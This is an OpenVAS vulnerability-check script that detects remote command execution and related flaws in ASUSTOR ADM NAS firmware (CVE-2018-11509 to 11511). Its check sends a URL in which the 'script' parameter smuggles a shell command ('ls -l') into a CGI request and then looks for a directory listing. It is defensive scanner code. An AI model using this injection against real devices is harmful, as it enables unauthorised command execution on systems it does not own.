##############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_asustor_adm_rce_vuln.nasl 12033 2018-10-23 11:14:43Z asteins $
#
# ASUSTOR ADM Multiple Vulnerabilities
#
# Authors:
# Christian Kuersteiner <christian.kuersteiner@greenbone.net>
#
# Copyright:
# Copyright (c) 2018 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation; either version 2 of the License, or
# (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/h:asustor:adm_firmware";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.141251");
  script_version("$Revision: 12033 $");
  script_tag(name:"last_modification", value:"$Date: 2018-10-23 13:14:43 +0200 (Tue, 23 Oct 2018) $");
  script_tag(name:"creation_date", value:"2018-06-29 14:18:00 +0200 (Fri, 29 Jun 2018)");
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");

  script_cve_id("CVE-2018-11509", "CVE-2018-11510", "CVE-2018-11511");

  script_tag(name:"qod_type", value:"remote_vul");

  script_tag(name:"solution_type", value:"VendorFix");

  script_name("ASUSTOR ADM Multiple Vulnerabilities");

  script_category(ACT_ATTACK);

  script_copyright("This script is Copyright (C) 2018 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_asustor_adm_detect.nasl");
  script_mandatory_keys("asustor_adm/detected");

  script_tag(name:"summary", value:"ASUSTOR ADM is prone to multiple vulnerabilities.");

  script_tag(name:"insight", value:"ASUSTOR ADM is prone to multiple vulnerabilities:

  - Default credentials and remote access (CVE-2018-11509)

  - Unauthenticated Remote Command Execution (CVE-2018-11510)

  - Blind SQL Injections (CVE-2018-11511)");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"affected", value:"ASUSTOR ADM 3.1.2.RHG1 and prior.");

  script_tag(name:"solution", value:"Update to the latest version.");

  script_xref(name:"URL", value:"https://packetstormsecurity.com/files/148919/ASUSTOR-NAS-ADM-3.1.0-Remote-Command-Execution-SQL-Injection.html");
  script_xref(name:"URL", value:"https://github.com/mefulton/CVE-2018-11510");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

if (!get_app_location(cpe: CPE, port: port, nofork: TRUE))
  exit(0);

url = '/portal/apis/aggrecate_js.cgi?script=launcher%22%26ls%20-l%26%22';

if (http_vuln_check(port: port, url: url, pattern: "[drwx-]+.*root.*root", check_header: TRUE)) {
  report = report_vuln_url(port: port, url: url);
  security_message(port: port, data: report);
  exit(0);
}

exit(99);
